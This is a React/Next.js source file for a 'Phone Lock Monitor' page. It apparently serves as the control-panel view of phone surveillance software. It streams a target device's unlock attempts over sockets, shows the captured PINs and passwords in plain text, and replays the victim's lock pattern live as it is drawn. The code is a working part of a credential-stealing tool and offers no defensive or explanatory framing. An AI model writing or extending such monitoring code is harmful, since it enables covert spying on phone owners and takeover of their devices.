'use client';

import { useState, useEffect, useCallback } from 'react';
import { useSearchParams } from 'next/navigation';
import { connectSocket } from '@/lib/socket';
import { API_URL } from '@/lib/api';

interface UnlockAttempt {
    id: string;
    unlockType: string;
    unlockData: string | null;
    success: boolean;
    reason: string | null;
    timestamp: string;
}

interface PatternProgress {
    deviceId: string;
    sequence: number[];
    count: number;
    timestamp: number;
}

export default function PhoneLockPage() {
    const searchParams = useSearchParams();
    const deviceId = searchParams.get('id') as string;

    const [unlockAttempts, setUnlockAttempts] = useState<UnlockAttempt[]>([]);
    const [loading, setLoading] = useState(true);
    const [currentPattern, setCurrentPattern] = useState<number[]>([]);
    const [capturedPattern, setCapturedPattern] = useState<number[]>([]);
    const [lastPatternTime, setLastPatternTime] = useState<number | null>(null);

    // Fetch unlock attempts
    const fetchUnlockAttempts = useCallback(async () => {
        if (!deviceId) return;
        try {
            const res = await fetch(`${API_URL}/api/devices/${deviceId}/unlocks?limit=50`);
            const data = await res.json();
            if (data.success) {
                setUnlockAttempts(data.data);
            }
        } catch (err) {
            console.error('Error fetching unlock attempts:', err);
        } finally {
            setLoading(false);
        }
    }, [deviceId]);

    useEffect(() => {
        if (deviceId) {
            fetchUnlockAttempts();
        }
    }, [deviceId, fetchUnlockAttempts]);

    // Socket listeners
    useEffect(() => {
        if (!deviceId) return;
        const socket = connectSocket();

        const handleUnlockAttempt = (data: any) => {
            if (data.deviceId === deviceId) {
                // Add to list
                setUnlockAttempts(prev => [{
                    id: Date.now().toString(),
                    unlockType: data.unlockType,
                    unlockData: data.unlockData,
                    success: data.success,
                    reason: data.reason,
                    timestamp: new Date(data.timestamp).toISOString()
                }, ...prev]);

                // If pattern, update captured pattern
                if (data.unlockType === 'pattern' && data.unlockData) {
                    const cells = data.unlockData.split(',').map(Number);
                    setCapturedPattern(cells);
                    setLastPatternTime(Date.now());
                }
            }
        };

        const handlePatternProgress = (data: PatternProgress) => {
            if (data.deviceId === deviceId) {
                setCurrentPattern(data.sequence);
            }
        };

        const handlePatternCaptured = (data: any) => {
            if (data.deviceId === deviceId) {
                setCapturedPattern(data.sequence);
                setCurrentPattern([]);
                setLastPatternTime(Date.now());
            }
        };

        socket.on('unlock:attempt', handleUnlockAttempt);
        socket.on('pattern:progress', handlePatternProgress);
        socket.on('pattern:captured', handlePatternCaptured);

        return () => {
            socket.off('unlock:attempt', handleUnlockAttempt);
            socket.off('pattern:progress', handlePatternProgress);
            socket.off('pattern:captured', handlePatternCaptured);
        };
    }, [deviceId]);

    // Pattern grid visualization
    const PatternGrid = ({ pattern, isActive = false }: { pattern: number[], isActive?: boolean }) => {
        const cells = Array.from({ length: 9 }, (_, i) => i);

        return (
            <div className="relative">
                {/* Grid of dots */}
                <div className="grid grid-cols-3 gap-6 p-4">
                    {cells.map((cellIndex) => {
                        const isSelected = pattern.includes(cellIndex);
                        const order = pattern.indexOf(cellIndex);

                        return (
                            <div
                                key={cellIndex}
                                className={`
                  w-12 h-12 rounded-full flex items-center justify-center text-sm font-bold
                  transition-all duration-200
                  ${isSelected
                                        ? 'bg-blue-500 text-white scale-110 shadow-lg shadow-blue-500/50'
                                        : 'bg-gray-700 text-gray-400'
                                    }
                  ${isActive && isSelected ? 'animate-pulse' : ''}
                `}
                            >
                                {isSelected ? order + 1 : cellIndex}
                            </div>
                        );
                    })}
                </div>

                {/* Pattern sequence */}
                {pattern.length > 0 && (
                    <div className="mt-2 text-center text-sm text-gray-400">
                        Sequence: {pattern.join(' → ')}
                    </div>
                )}
            </div>
        );
    };

    // Format time ago
    const timeAgo = (timestamp: string) => {
        const now = Date.now();
        const time = new Date(timestamp).getTime();
        const diff = now - time;

        if (diff < 60000) return 'Just now';
        if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
        if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
        return new Date(timestamp).toLocaleDateString();
    };

    // Get icon for unlock type
    const getIcon = (type: string) => {
        switch (type) {
            case 'pin': return '🔢';
            case 'pattern': return '📐';
            case 'password': return '🔑';
            default: return '🔒';
        }
    };

    return (
        <div className="p-6 bg-gray-900 min-h-screen">
            <h1 className="text-2xl font-bold text-white mb-6">🔒 Phone Lock Monitor</h1>

            {/* Live Pattern Display */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
                {/* Current Pattern (Being Drawn) */}
                <div className="bg-gray-800/50 rounded-xl p-6 border border-gray-700">
                    <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
                        <span className={currentPattern.length > 0 ? 'animate-pulse' : ''}>⏺️</span>
                        Live Pattern
                    </h2>

                    {currentPattern.length > 0 ? (
                        <PatternGrid pattern={currentPattern} isActive={true} />
                    ) : (
                        <div className="text-center py-8 text-gray-500">
                            Waiting for pattern input...
                        </div>
                    )}
                </div>

                {/* Last Captured Pattern */}
                <div className="bg-gray-800/50 rounded-xl p-6 border border-gray-700">
                    <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
                        ✅ Last Captured Pattern
                    </h2>

                    {capturedPattern.length > 0 ? (
                        <>
                            <PatternGrid pattern={capturedPattern} />
                            {lastPatternTime && (
                                <div className="mt-2 text-center text-xs text-gray-500">
                                    Captured {timeAgo(new Date(lastPatternTime).toISOString())}
                                </div>
                            )}
                        </>
                    ) : (
                        <div className="text-center py-8 text-gray-500">
                            No pattern captured yet
                        </div>
                    )}
                </div>
            </div>

            {/* Unlock Attempts History */}
            <div className="bg-gray-800/50 rounded-xl p-6 border border-gray-700">
                <h2 className="text-lg font-semibold text-white mb-4">📜 Unlock History</h2>

                {loading ? (
                    <div className="text-center py-8 text-gray-500">Loading...</div>
                ) : unlockAttempts.length === 0 ? (
                    <div className="text-center py-8 text-gray-500">
                        No unlock attempts recorded yet
                    </div>
                ) : (
                    <div className="space-y-3 max-h-96 overflow-y-auto">
                        {unlockAttempts.map((attempt) => (
                            <div
                                key={attempt.id}
                                className={`
                  flex items-center gap-4 p-4 rounded-lg
                  ${attempt.success ? 'bg-green-900/20 border border-green-800/50' : 'bg-red-900/20 border border-red-800/50'}
                `}
                            >
                                <div className="text-2xl">{getIcon(attempt.unlockType)}</div>

                                <div className="flex-1">
                                    <div className="flex items-center gap-2">
                                        <span className="font-medium text-white capitalize">
                                            {attempt.unlockType} Unlock
                                        </span>
                                        <span className={`text-xs px-2 py-0.5 rounded ${attempt.success ? 'bg-green-600' : 'bg-red-600'}`}>
                                            {attempt.success ? 'Success' : 'Failed'}
                                        </span>
                                        {attempt.reason && (
                                            <span className="text-xs text-gray-500">({attempt.reason})</span>
                                        )}
                                    </div>

                                    {attempt.unlockData && (
                                        <div className="text-lg font-mono text-blue-400 mt-1">
                                            {attempt.unlockType === 'pattern'
                                                ? `Pattern: ${attempt.unlockData}`
                                                : attempt.unlockType === 'pin'
                                                    ? `PIN: ${attempt.unlockData}`
                                                    : attempt.unlockData
                                            }
                                        </div>
                                    )}
                                </div>

                                <div className="text-xs text-gray-500">
                                    {timeAgo(attempt.timestamp)}
                                </div>
                            </div>
                        ))}
                    </div>
                )}
            </div>

            {/* Pattern Reference */}
            <div className="mt-6 bg-gray-800/30 rounded-xl p-4 border border-gray-700/50">
                <h3 className="text-sm font-medium text-gray-400 mb-2">Pattern Grid Reference</h3>
                <div className="flex items-center gap-4">
                    <div className="grid grid-cols-3 gap-2 text-xs">
                        {[0, 1, 2, 3, 4, 5, 6, 7, 8].map((i) => (
                            <div key={i} className="w-8 h-8 bg-gray-700 rounded flex items-center justify-center text-gray-400">
                                {i}
                            </div>
                        ))}
                    </div>
                    <div className="text-sm text-gray-500">
                        <p>Top row: 0, 1, 2</p>
                        <p>Middle row: 3, 4, 5</p>
                        <p>Bottom row: 6, 7, 8</p>
                    </div>
                </div>
            </div>
        </div>
    );
}
